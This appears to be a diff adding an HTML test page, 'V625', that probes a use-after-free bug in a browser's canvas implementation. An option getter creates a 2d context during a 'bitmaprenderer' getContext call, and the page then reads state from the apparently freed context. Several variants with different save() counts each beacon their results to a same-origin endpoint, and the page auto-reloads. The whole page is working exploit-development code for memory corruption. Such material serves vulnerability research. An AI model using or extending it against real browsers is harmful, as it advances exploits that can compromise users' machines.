@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V625</title></head>
+<body><pre id="out">V625 — inline vs external stateStack crash isolation</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  try{new Image().src='/beacon/V625-'+tag+'?d='+encodeURIComponent(String(d).slice(0,600))+'&t='+Date.now();}catch(e){}
+}
+
+bk('BOOT','v625-crash-isolation');
+
+/* =================================================================
+ * TEST A: UAF WITHOUT saves (inline stateStack stays within 768B).
+ * lineWidth at offset ~176 of freed 768B block (well past bytes 0-7).
+ * If this WORKS → crash is from external buffer dereference.
+ * If this CRASHES → reading freed 768B itself crashes.
+ * ================================================================= */
+var cA = document.createElement('canvas'); cA.width=1; cA.height=1;
+var icA = null, dA = {};
+Object.defineProperty(dA, 'alpha', { get: function() {
+  icA = cA.getContext('2d');
+  if (!icA) return true;
+  icA.lineWidth = 42.42;
+  icA.miterLimit = 77.77;
+  return true;
+}});
+cA.getContext('bitmaprenderer', dA);
+var lwA = -999, mlA = -999;
+try { lwA = icA.lineWidth; } catch(e) { lwA = 'E:'+e.name; }
+try { mlA = icA.miterLimit; } catch(e) { mlA = 'E:'+e.name; }
+bk('TA', 'lw='+lwA+',ml='+mlA);
+say('TA (no saves, inline): lw='+lwA+', ml='+mlA);
+
+/* =================================================================
+ * TEST B: UAF WITH 1 save (still inline, cap=1 initial).
+ * Saving once might NOT trigger external alloc if cap is already 1.
+ * ================================================================= */
+var cB = document.createElement('canvas'); cB.width=1; cB.height=1;
+var icB = null, dB = {};
+Object.defineProperty(dB, 'alpha', { get: function() {
+  icB = cB.getContext('2d');
+  if (!icB) return true;
+  icB.save();
+  icB.lineWidth = 33.33;
+  return true;
+}});
+cB.getContext('bitmaprenderer', dB);
+var lwB = -999;
+try { lwB = icB.lineWidth; } catch(e) { lwB = 'E:'+e.name; }
+bk('TB', 'lw='+lwB);
+say('TB (1 save): lw='+lwB);
+
+/* =================================================================
+ * TEST C: UAF WITH 2 saves (triggers external alloc: cap grows to 3).
+ * If TA works but TC crashes → external buffer is the problem.
+ * ================================================================= */
+var cC = document.createElement('canvas'); cC.width=1; cC.height=1;
+var icC = null, dC = {};
+Object.defineProperty(dC, 'alpha', { get: function() {
+  icC = cC.getContext('2d');
+  if (!icC) return true;
+  icC.save();
+  icC.save();
+  icC.lineWidth = 22.22;
+  return true;
+}});
+cC.getContext('bitmaprenderer', dC);
+var lwC = -999;
+try { lwC = icC.lineWidth; } catch(e) { lwC = 'E:'+e.name; }
+bk('TC', 'lw='+lwC);
+say('TC (2 saves): lw='+lwC);
+
+/* =================================================================
+ * TEST D: UAF WITH 8 saves (definitely external, V599/V611 case).
+ * ================================================================= */
+var cD = document.createElement('canvas'); cD.width=1; cD.height=1;
+var icD = null, dD = {};
+Object.defineProperty(dD, 'alpha', { get: function() {
+  icD = cD.getContext('2d');
+  if (!icD) return true;
+  for(var i=0;i<8;i++) icD.save();
+  icD.lineWidth = 11.11;
+  return true;
+}});
+cD.getContext('bitmaprenderer', dD);
+var lwD = -999;
+try { lwD = icD.lineWidth; } catch(e) { lwD = 'E:'+e.name; }
+bk('TD', 'lw='+lwD);
+say('TD (8 saves): lw='+lwD);
+
+/* =================================================================
+ * TEST E: UAF no saves, read .canvas property (returns DOM element).
+ * Tests if the wrapper itself can be accessed at all.
+ * ================================================================= */
+var cE = document.createElement('canvas'); cE.width=1; cE.height=1;
+var icE = null, dE = {};
+Object.defineProperty(dE, 'alpha', { get: function() {
+  icE = cE.getContext('2d');
+  return true;
+}});
+cE.getContext('bitmaprenderer', dE);
+var canE = '?';
+try { canE = (icE.canvas === cE) ? 'match' : 'diff'; } catch(e) { canE = 'E:'+e.name; }
+bk('TE', 'canvas='+canE);
+say('TE (canvas prop): '+canE);
+
+/* =================================================================
+ * TEST F: typeof check (pure JS, no native binding).
+ * ================================================================= */
+var typeF = '?';
+try { typeF = typeof icE; } catch(e) { typeF = 'E:'+e.name; }
+bk('TF', 'typeof='+typeF);
+say('TF (typeof): '+typeF);
+
+bk('DONE', 'all-tests-complete');
+say('\nDONE');
+
+setTimeout(function(){ location.reload(); }, 15000);
+</script>
+</body></html>
